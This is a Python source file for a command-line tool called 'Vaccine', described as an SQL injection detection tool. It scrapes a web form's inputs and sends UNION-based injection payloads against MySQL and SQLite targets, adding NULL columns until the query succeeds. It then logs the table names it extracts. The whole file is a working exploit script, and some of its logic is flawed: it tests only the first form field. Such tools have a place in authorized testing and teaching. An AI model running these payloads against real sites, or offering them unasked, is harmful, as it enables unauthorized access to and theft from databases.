import requests
import argparse
from bs4 import BeautifulSoup
import difflib

injections_select = {
            'mysql': " UNION SELECT table_name",
            'sqlite': " UNION SELECT name, NULL",
        }

injections_FROM = {
            'mysql': " FROM information_schema.tables #",
            'sqlite': " FROM sqlite_master --",
        }

class Vaccine:
    def __init__(self, url, method='GET', archive=None):
        self.url = url
        self.method = method
        self.archive = archive or 'vulnerabilities.log'
        self.database = None
        self.database_tab = ["mysql", "sqlite"]
        self.form = []

    def inject(self, payload):
        for input_test in self.form:
            data = {}
            for input in self.form:
                if input != input_test:
                    data[input] = "no empty input"
                else:
                    data[input] = payload
            print(data)
            if self.method.upper() == 'GET':
                print("GET")
                response = requests.get(self.url, params=data)
            elif self.method.upper() == 'POST':
                print("POST")
                print(data)
                print(self.url)

                response = requests.post(self.url, data=data)
                print(response.text)
            if self.database == None:
                self.database = self.identify_sgbd(response)
            return response, input_test
            

    def test_injection(self):
        before = requests.get(self.url)
        self.form = self.scrap_form()
        if self.database == None:
            self.inject("'")

        nb_null = ""
        payload = "' OR 1=1" + injections_select[self.database] + nb_null + injections_FROM[self.database]
        response, input_test = self.inject(payload)
        while self.is_vulnerable(before, response) != True and len(nb_null) < 100:
            nb_null += ",NULL"
            payload = "' OR 1=1" + injections_select[self.database] + nb_null + injections_FROM[self.database]
            response, input_test = self.inject(payload)
        if len(nb_null) < 100:
            self.log_result(self.url, payload, input_test, before.text, response.text)
            return True
        return False
        

    def is_vulnerable(self, before, response):

        error_messages = ["you have an error in your SQL syntax;", 
                            "unclosed quotation mark after the character string",
                            "syntax error", "warning", "failed", "flag", 
                            "invalid", "error", "exception",]
        if before.text != response.text:
            for error_message in error_messages:
                if error_message in response.text.lower():
                    return False
        return True

    def log_result(self, url, payload, input_test, before, after):
        # print(f"before: {before}")
        # print(f"after: {after}")
        with open(self.archive, 'a') as file:
            if self.database:
                file.write(f'Database: {self.database}\n')
            file.write(f'URL: {url}\nPayload: {payload}\nInput: {input_test}\n')
            soup = BeautifulSoup(after, 'html.parser')
            pre_tags = soup.find_all('pre')
            file.write('--- Extracted Results ---\n')
            for pre in pre_tags:
                text = pre.get_text(separator="\n")
                file.write(f"{text}\n")
            
            file.write('--- End of Extracted Results ---\n\n')

    def run(self):
        if self.test_injection() == False:
            print("No vulnerabilities found")
            return
        print("Vulnerabilities found")

    def identify_sgbd(self, after):
        response = requests.get(self.url)
        server_header = response.headers.get('Server', '').lower()
        powered_by_header = response.headers.get('X-Powered-By', '').lower()

        # Analyze HTTP headers
        for db in self.database_tab:
            if db in server_header or db in powered_by_header:
                return db

        # Analyze error messages
        error_response = after
        error_message = error_response.text.lower()
        for db in self.database_tab:
            if db in error_message:
                return db

        print("Database not identified")
        exit(0)
    
    def scrap_form(self):
        '''
        Scrap the form from the URL
        '''
        response = requests.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        input_names = [input.get('name') for input in form.find_all('input') if input.get('name')]
        return input_names


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
    parser.add_argument("url", help="URL to test for SQL injection")
    parser.add_argument("-X", "--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("-o", "--archive", help="File to store the results")
    
    args = parser.parse_args()
    
    vaccine = Vaccine(url=args.url, method=args.method, archive=args.archive)
    vaccine.run()
